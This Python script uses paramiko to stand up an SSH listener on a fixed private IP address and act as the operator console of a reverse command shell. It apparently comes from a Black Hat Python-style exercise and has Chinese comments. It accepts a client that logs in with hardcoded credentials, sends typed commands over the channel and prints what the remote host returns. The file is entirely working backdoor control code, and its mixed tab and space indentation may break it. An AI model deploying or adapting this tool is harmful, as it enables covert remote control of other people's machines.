import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, "test_rsa.key"))
#这里的密钥文件可以使用ssh生成的密钥，然后替换即可

class Server(paramiko.ServerInterface):
	def __init__(self):
		self.event = threading.Event()
		
	def check_channel_request(self, kind, chanid):
		if kind == "session":
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

	def check_auth_password(self, username, password):
            if (username == "tim") and (password == "sekret"):
                return paramiko.AUTH_SUCCESSFUL

if __name__ =="__main__":
    server = "192.168.223.128"
    ssh_port = 22
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+]正在监听链接......")
        client, addr = sock.accept()
    except Exception as e:
        print("[-]监听失败：" + str(e))
        sys.exit(1)
    else:
        print("[+]得到一个链接!", client, addr)
        
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)
    
    chan = bhSession.accept(20)
    if chan is None:
        print("***No channel.")
        sys.exit(1)
        
    print("[+]通过验证！")
    print(chan.recv(1024))
    chan.send("欢迎来到bh_ssh")
    try:
        while True:
            command = input("输入命令：")
            if command != "exit":
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send("退出")
                print("正在退出中..........")
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()